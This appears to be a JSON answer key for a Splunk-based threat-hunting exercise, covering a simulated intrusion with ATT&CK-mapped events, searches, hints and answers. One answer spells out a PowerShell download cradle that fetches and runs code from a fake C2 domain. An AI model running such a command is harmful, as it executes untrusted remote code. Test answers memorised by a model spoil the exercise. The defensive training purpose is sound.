{
  "generated_at": "2026-05-04T14:46:50.121676-04:00",
  "seed": 1337,
  "initial_victim": {
    "username": "lrodriguez",
    "display_name": "Lawrence Rodriguez",
    "department": "Communications & Outreach",
    "workstation": "CCS-WS-1025",
    "workstation_fqdn": "ccs-ws-1025.ccs.dev",
    "workstation_ip": "10.10.10.76"
  },
  "it_admin_pivot": {
    "username": "awilliams",
    "workstation": "CCS-WS-1010",
    "workstation_fqdn": "ccs-ws-1010.ccs.dev",
    "workstation_ip": "10.10.10.61"
  },
  "attacker_infrastructure": {
    "scanner_ip_1": "45.142.212.100",
    "scanner_ip_2": "45.142.212.101",
    "scanner_ip_3": "185.220.101.47",
    "c2_domain": "cdn-update.globalmetrics.net",
    "c2_ip": "103.75.190.222",
    "exfil_domain": "telemetry.syncanalytics.io",
    "exfil_ip": "185.250.151.84",
    "dns_tunnel_ns": "ns1.r3solve-stats.com",
    "staging_domain": "docs-preview.officecdn-live.com",
    "c2_ja3": "a0e9f5d64349fb13191bc781f81f42e1",
    "exfil_ja3": "3b5074b1b5d032e5620f69f9159fd40d"
  },
  "events": [
    {
      "phase": "Reconnaissance",
      "technique_id": "T1595.002",
      "technique_name": "Active Scanning: Vulnerability Scanning",
      "timestamp": "2025-09-08T13:00:04-0400",
      "host": "ccs-web01.ccs.dev",
      "user": "ATTACKER",
      "log_source": "network/http.log",
      "event_id": 0,
      "difficulty": "beginner",
      "signal": "High 404 rate on WEB01 from external scanner IPs",
      "splunk_search": "index=ctf sourcetype=\"zeek:http:json\" status=404 | stats count by src_ip | where count > 50",
      "answer": "45.142.212.100",
      "hint": "Look for IPs generating unusually high 404 error rates against the web server"
    },
    {
      "phase": "Reconnaissance",
      "technique_id": "T1593.001",
      "technique_name": "Search Open Websites/Domains: Social Media",
      "timestamp": "2025-09-08T13:05:00-0400",
      "host": "ccs-web01.ccs.dev",
      "user": "ATTACKER",
      "log_source": "network/dns.log",
      "event_id": 0,
      "difficulty": "expert",
      "signal": "External DNS probing of internal CCS subdomains — Autodiscover reveals Exchange infrastructure",
      "splunk_search": "index=ctf sourcetype=\"zeek:dns:json\" query=\"*.ccs.dev\" | where src_ip=\"45.142.212.100\" | table query",
      "answer": "autodiscover.ccs.dev",
      "hint": "The attacker probed multiple CCS subdomains — which one is specific to Microsoft Exchange and reveals mail server infrastructure?"
    },
    {
      "phase": "Initial Access",
      "technique_id": "T1566.001",
      "technique_name": "Phishing: Spearphishing Attachment",
      "timestamp": "2025-09-09T10:15:50-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 1,
      "difficulty": "beginner",
      "signal": "WINWORD.EXE spawning cmd.exe",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=1 ParentImage=\"*WINWORD*\" Image=\"*cmd.exe*\"",
      "answer": "cmd.exe",
      "hint": "Look for Office applications spawning command-line processes"
    },
    {
      "phase": "Initial Access",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting: PowerShell",
      "timestamp": "2025-09-09T10:15:53-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 1,
      "difficulty": "expert",
      "signal": "Encoded PowerShell spawned by cmd.exe which was spawned by WINWORD",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=1 Image=\"*powershell.exe*\" CommandLine=\"* -enc *\" | table TimeCreated Computer CommandLine",
      "answer": "IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.globalmetrics.net/update')",
      "hint": "Decode the base64 -enc parameter to reveal the download cradle"
    },
    {
      "phase": "Initial Access",
      "technique_id": "T1566.001",
      "technique_name": "Phishing: Spearphishing Attachment",
      "timestamp": "2025-09-09T10:15:57-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "network/dns.log",
      "event_id": 0,
      "difficulty": "beginner",
      "signal": "DNS query for brand-new C2 domain never seen in baseline",
      "splunk_search": "index=ctf sourcetype=\"zeek:dns:json\" query=\"cdn-update.globalmetrics.net\"",
      "answer": "cdn-update.globalmetrics.net",
      "hint": "Look for DNS queries to domains that have never appeared in the prior 24 hours of logs"
    },
    {
      "phase": "Initial Access",
      "technique_id": "T1566.001",
      "technique_name": "Phishing: Spearphishing Attachment",
      "timestamp": "2025-09-09T10:15:57-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "network/ssl.log",
      "event_id": 0,
      "difficulty": "expert",
      "signal": "JA3 hash matching Outlook (a0e9f5d64349fb13191bc781f81f42e1) used by powershell.exe",
      "splunk_search": "index=ctf sourcetype=\"zeek:ssl:json\" ja3=\"a0e9f5d64349fb13191bc781f81f42e1\" [search index=ctf EventID=3 Image=\"*powershell*\" | rename DestinationIp AS dest_ip | fields dest_ip] | stats count by server_name dest_ip",
      "answer": "cdn-update.globalmetrics.net",
      "hint": "Correlate Sysmon EID 3 network connections from powershell.exe with ssl.log JA3 hashes"
    },
    {
      "phase": "Execution & Persistence",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "timestamp": "2025-09-09T10:48:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/windows_security.json",
      "event_id": 4698,
      "difficulty": "beginner",
      "signal": "Scheduled task binary in AppData\\Roaming (not Program Files)",
      "splunk_search": "index=ctf EventID=4698 TaskName=\"*MicrosoftEdgeUpdate*\" | where like(TaskContent,\"%AppData%\")",
      "answer": "C:\\Users\\lrodriguez\\AppData\\Roaming\\MicrosoftEdge\\update.exe",
      "hint": "Legitimate scheduled tasks point to Program Files, not AppData"
    },
    {
      "phase": "Execution & Persistence",
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart: Registry Run Keys",
      "timestamp": "2025-09-09T10:48:15-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 13,
      "difficulty": "beginner",
      "signal": "Registry Run key pointing to AppData path (not a legitimate OneDrive path)",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=13 TargetObject=\"*Run*\" Details=\"*AppData*Roaming*\" NOT Details=\"*Microsoft\\\\OneDrive*\"",
      "answer": "OneDriveSync",
      "hint": "Legitimate OneDrive run keys point to %LOCALAPPDATA%, not %APPDATA%\\Roaming"
    },
    {
      "phase": "Execution & Persistence",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process: Windows Service",
      "timestamp": "2025-09-09T10:50:15-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/windows_system.json",
      "event_id": 7045,
      "difficulty": "beginner",
      "signal": "Service binary in C:\\Windows\\Temp (never legitimate)",
      "splunk_search": "index=ctf EventID=7045 ImagePath=\"*Temp*\" | table ServiceName ImagePath Computer",
      "answer": "C:\\Windows\\Temp\\svchost32.exe",
      "hint": "Legitimate service binaries are never installed in Windows Temp"
    },
    {
      "phase": "Privilege Escalation",
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation",
      "timestamp": "2025-09-09T13:17:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/windows_security.json",
      "event_id": 4624,
      "difficulty": "expert",
      "signal": "LogonType 9 (NewCredentials) with different TargetUserName than workstation owner",
      "splunk_search": "index=ctf EventID=4624 LogonType=9 TargetUserName!=\"lrodriguez\" Computer=\"ccs-ws-1025.ccs.dev\"",
      "answer": "awilliams",
      "hint": "LogonType 9 is used by runas /netonly \u2014 look for it where the target account differs from the logged-on user"
    },
    {
      "phase": "Privilege Escalation",
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control: Bypass UAC",
      "timestamp": "2025-09-09T13:22:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 1,
      "difficulty": "expert",
      "signal": "eventvwr.exe spawning suspicious binary at High integrity level",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=1 ParentImage=\"*eventvwr.exe*\" IntegrityLevel=High",
      "answer": "C:\\Windows\\Temp\\svchost32.exe",
      "hint": "eventvwr.exe is a known UAC bypass vector \u2014 look for it as a parent process"
    },
    {
      "phase": "Privilege Escalation",
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation",
      "timestamp": "2025-09-09T13:25:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "ccssupport",
      "log_source": "host/windows_security.json",
      "event_id": 4720,
      "difficulty": "beginner",
      "signal": "New account created on a non-IT workstation by an IT admin token",
      "splunk_search": "index=ctf EventID=4720 NOT Computer=\"*DC*\" | table TargetUserName SubjectUserName Computer",
      "answer": "ccssupport",
      "hint": "Account creation events on non-IT workstations are suspicious"
    },
    {
      "phase": "Defense Evasion",
      "technique_id": "T1070.001",
      "technique_name": "Indicator Removal: Clear Windows Event Logs",
      "timestamp": "2025-09-10T08:33:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "ccssupport",
      "log_source": "host/windows_security.json",
      "event_id": 1102,
      "difficulty": "beginner",
      "signal": "EID 1102 (Security log cleared) \u2014 extremely rare in benign traffic",
      "splunk_search": "index=ctf EventID=1102",
      "answer": "ccssupport",
      "hint": "EventID 1102 means the security log was cleared \u2014 search for any instance"
    },
    {
      "phase": "Defense Evasion",
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal: Timestomp",
      "timestamp": "2025-09-10T08:41:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 2,
      "difficulty": "expert",
      "signal": "Sysmon EID 2 (file creation time changed) on executable in AppData",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=2 TargetFilename=\"*AppData*\" TargetFilename=\"*.exe\"",
      "answer": "C:\\Users\\lrodriguez\\AppData\\Roaming\\MicrosoftEdge\\update.exe",
      "hint": "EID 2 records when a file creation timestamp is modified \u2014 attackers use this to hide malware age"
    },
    {
      "phase": "Credential Access",
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "timestamp": "2025-09-10T09:33:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 10,
      "difficulty": "intermediate",
      "signal": "Non-system process accessing LSASS with 0x1010 (PROCESS_VM_READ | QUERY_LIMITED)",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=10 TargetImage=\"*lsass.exe*\" NOT SourceImage=\"*System32*\" NOT SourceImage=\"*SysWOW64*\"",
      "answer": "C:\\Windows\\Temp\\svchost32.exe",
      "hint": "LSASS access from non-system paths is a strong credential dumping indicator"
    },
    {
      "phase": "Credential Access",
      "technique_id": "T1558.003",
      "technique_name": "Steal/Forge Kerberos Tickets: Kerberoasting",
      "timestamp": "2025-09-10T09:45:02-0400",
      "host": "ccs-dc01.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/windows_kerberos.json",
      "event_id": 4769,
      "difficulty": "intermediate",
      "signal": "12 TGS requests in 4 minutes with RC4 (0x17) encryption type instead of AES",
      "splunk_search": "index=ctf EventID=4769 TicketEncryptionType=\"0x17\" | eval ServiceName=mvindex(split(ServiceName,\"/\"),0) | stats count by ServiceName | sort -count",
      "answer": "svc_sql",
      "hint": "Kerberoasting requests use RC4 (0x17) \u2014 look for sudden spikes in 4769 from a single source"
    },
    {
      "phase": "Credential Access",
      "technique_id": "T1558.004",
      "technique_name": "Steal/Forge Kerberos Tickets: AS-REP Roasting",
      "timestamp": "2025-09-10T09:53:00-0400",
      "host": "ccs-dc01.ccs.dev",
      "user": "svc_scan",
      "log_source": "host/windows_kerberos.json",
      "event_id": 4768,
      "difficulty": "expert",
      "signal": "EID 4768 with PreAuthType=0 \u2014 account does not require pre-authentication",
      "splunk_search": "index=ctf EventID=4768 PreAuthType=0",
      "answer": "svc_scan",
      "hint": "AS-REP Roasting targets accounts with pre-authentication disabled (PreAuthType=0)"
    },
    {
      "phase": "Discovery",
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "timestamp": "2025-09-10T11:32:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/sysmon.json",
      "event_id": 1,
      "difficulty": "intermediate",
      "signal": "Multiple net.exe and nltest.exe commands in rapid succession from svchost32.exe",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=1 (Image=\"*net.exe*\" OR Image=\"*nltest.exe*\") | search ParentImage=\"*svchost32*\" | bin _time span=2m | stats count by _time,Computer",
      "answer": "net user /domain",
      "hint": "Look for Windows built-in tools being spawned by a suspicious process running from C:\\Windows\\Temp. The specific command reveals what domain information the attacker was after."
    },
    {
      "phase": "Discovery",
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "timestamp": "2025-09-10T11:47:00-0400",
      "host": "ccs-dc01.ccs.dev",
      "user": "lrodriguez",
      "log_source": "host/windows_security.json",
      "event_id": 4662,
      "difficulty": "expert",
      "signal": "180+ EID 4662 events in 6 minutes from one workstation \u2014 BloodHound LDAP pattern",
      "splunk_search": "index=ctf EventID=4662 ObjectType=\"{bf967aba-0de6-11d0-a285-00aa003049e2}\" | bin _time span=10m | stats count by _time,SubjectUserName | where count > 50",
      "answer": "lrodriguez",
      "hint": "BloodHound generates massive LDAP object access \u2014 look for volume spikes on EID 4662"
    },
    {
      "phase": "Lateral Movement",
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "timestamp": "2025-09-10T13:45:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "awilliams",
      "log_source": "host/windows_security.json",
      "event_id": 4624,
      "difficulty": "intermediate",
      "signal": "LogonType 3 to CCS-FS01 from victim workstation IP at unusual time",
      "splunk_search": "index=ctf EventID=4624 LogonType=3 Computer=\"ccs-fs01.ccs.dev\" IpAddress=\"10.10.10.76\"",
      "answer": "10.10.10.76",
      "hint": "Network logons (type 3) to the file server from a workstation that normally doesn't connect are suspicious"
    },
    {
      "phase": "Lateral Movement",
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution (PsExec)",
      "timestamp": "2025-09-10T14:10:00-0400",
      "host": "ccs-ws-1010.ccs.dev",
      "user": "awilliams",
      "log_source": "host/windows_system.json",
      "event_id": 7045,
      "difficulty": "intermediate",
      "signal": "PSEXESVC service installed \u2014 well-known PsExec artifact",
      "splunk_search": "index=ctf EventID=7045 ServiceName=PSEXESVC",
      "answer": "PSEXESVC",
      "hint": "PSEXESVC is always installed by PsExec \u2014 any instance is worth investigating"
    },
    {
      "phase": "Lateral Movement",
      "technique_id": "T1021.001",
      "technique_name": "Remote Services: RDP",
      "timestamp": "2025-09-10T15:46:00-0400",
      "host": "ccs-lt-1069.ccs.dev",
      "user": "awilliams",
      "log_source": "host/windows_security.json",
      "event_id": 4624,
      "difficulty": "beginner",
      "signal": "RDP logon (LogonType 10) to Executive workstation from IT workstation",
      "splunk_search": "index=ctf EventID=4624 LogonType=10 Computer=\"*ccs-lt*\" | table TargetUserName IpAddress Computer",
      "answer": "awilliams",
      "hint": "RDP (LogonType 10) from an IT workstation to an Executive laptop is an unusual pairing"
    },
    {
      "phase": "Collection",
      "technique_id": "T1039",
      "technique_name": "Data from Network Shared Drive",
      "timestamp": "2025-09-10T19:10:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "awilliams",
      "log_source": "network/conn.log",
      "event_id": 0,
      "difficulty": "intermediate",
      "signal": "200+ SMB connections to FS01 overnight from IT admin workstation \u2014 volume anomaly",
      "splunk_search": "index=ctf sourcetype=\"zeek:conn:json\" id_resp_p=445 dest_ip=\"10.10.2.10\" | bin _time span=1h | stats sum(orig_bytes) as bytes_sent count by _time,src_ip | where bytes_sent > 100000000",
      "answer": "10.10.10.61",
      "hint": "Look for abnormally large SMB data volumes to the file server outside business hours"
    },
    {
      "phase": "Collection",
      "technique_id": "T1039",
      "technique_name": "Data from Network Shared Drive",
      "timestamp": "2025-09-10T20:30:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "awilliams",
      "log_source": "network/conn.log",
      "event_id": 0,
      "difficulty": "expert",
      "signal": "DB01 connections originating from FS01 (server-to-server) \u2014 unusual baseline",
      "splunk_search": "index=ctf sourcetype=\"zeek:conn:json\" src_ip=\"10.10.2.10\" dest_ip=\"10.10.2.20\" id_resp_p=5432 | stats sum(resp_bytes) as bytes_pulled",
      "answer": "10.10.2.10",
      "hint": "Normally only workstations connect to DB01 \u2014 connections from FS01 are unusual"
    },
    {
      "phase": "Exfiltration",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "timestamp": "2025-09-11T02:03:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "ATTACKER",
      "log_source": "network/conn.log",
      "event_id": 0,
      "difficulty": "intermediate",
      "signal": "6 sessions of 80\u2013120 MB each from CCS-FS01 to unknown external IP at 2am",
      "splunk_search": "index=ctf sourcetype=\"zeek:conn:json\" src_ip=\"10.10.2.10\" id_resp_p=443 | where orig_bytes > 80000000 | stats count sum(orig_bytes) by dest_ip",
      "answer": "185.250.151.84",
      "hint": "Large outbound transfers from a server at 2am are a strong exfiltration indicator"
    },
    {
      "phase": "Exfiltration",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "timestamp": "2025-09-11T02:03:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "ATTACKER",
      "log_source": "network/dns.log",
      "event_id": 0,
      "difficulty": "beginner",
      "signal": "DNS query for exfil domain never seen in benign baseline",
      "splunk_search": "index=ctf sourcetype=\"zeek:dns:json\" query=\"telemetry.syncanalytics.io\"",
      "answer": "telemetry.syncanalytics.io",
      "hint": "The exfil domain will appear as a first-ever DNS query from the file server"
    },
    {
      "phase": "Exfiltration",
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over Alternative Protocol: DNS",
      "timestamp": "2025-09-11T02:10:00-0400",
      "host": "ccs-ws-1025.ccs.dev",
      "user": "lrodriguez",
      "log_source": "network/dns.log",
      "event_id": 0,
      "difficulty": "expert",
      "signal": "337 subdomain DNS queries to r3solve-stats.com over 45 minutes \u2014 volume anomaly on single parent domain",
      "splunk_search": "index=ctf sourcetype=\"zeek:dns:json\" | rex field=query \"(?P<parent_domain>[^.]+\\.[^.]+)$\" | stats count by parent_domain src_ip | sort -count",
      "answer": "r3solve-stats.com",
      "hint": "Look for a parent domain that received a disproportionately large number of DNS queries from 10.10.10.76. Legitimate browsing spreads queries across many domains; tunneling concentrates them on one."
    },
    {
      "phase": "Collection",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "timestamp": "2025-09-11T02:15:00-0400",
      "host": "ccs-fs01.ccs.dev",
      "user": "awilliams",
      "log_source": "host/sysmon.json",
      "event_id": 1,
      "difficulty": "beginner",
      "signal": "7z.exe with -p flag (password-protected archive) in ProgramData\\MicrosoftTelemetry",
      "splunk_search": "index=ctf sourcetype=XmlWinEventLog EventID=1 Image=\"*7z.exe*\" CommandLine=\"* -p*\"",
      "answer": "7z.exe",
      "hint": "Password-protected archives (-p flag) are used to prevent analysis of exfiltrated data"
    }
  ],
  "summary": {
    "total_events": 28,
    "phases_covered": 10,
    "by_phase": {
      "Collection": 3,
      "Credential Access": 3,
      "Defense Evasion": 2,
      "Discovery": 2,
      "Execution & Persistence": 3,
      "Exfiltration": 3,
      "Initial Access": 4,
      "Lateral Movement": 3,
      "Privilege Escalation": 3,
      "Reconnaissance": 2
    },
    "by_difficulty": {
      "beginner": 11,
      "expert": 10,
      "intermediate": 7
    },
    "by_technique_id": {
      "T1003.001": 1,
      "T1021.001": 1,
      "T1021.002": 1,
      "T1027.010": 1,
      "T1039": 2,
      "T1041": 2,
      "T1048.002": 1,
      "T1053.005": 1,
      "T1059.001": 1,
      "T1069.002": 1,
      "T1070.001": 1,
      "T1070.006": 1,
      "T1087.002": 1,
      "T1134.001": 2,
      "T1543.003": 1,
      "T1547.001": 1,
      "T1548.002": 1,
      "T1558.003": 1,
      "T1558.004": 1,
      "T1560.001": 1,
      "T1566.001": 3,
      "T1569.002": 1,
      "T1593.001": 1,
      "T1595.002": 1
    },
    "by_log_source": {
      "host/sysmon.json": 8,
      "host/windows_kerberos.json": 2,
      "host/windows_security.json": 8,
      "host/windows_system.json": 2,
      "network/conn.log": 3,
      "network/dns.log": 4,
      "network/http.log": 1,
      "network/ssl.log": 1
    }
  }
}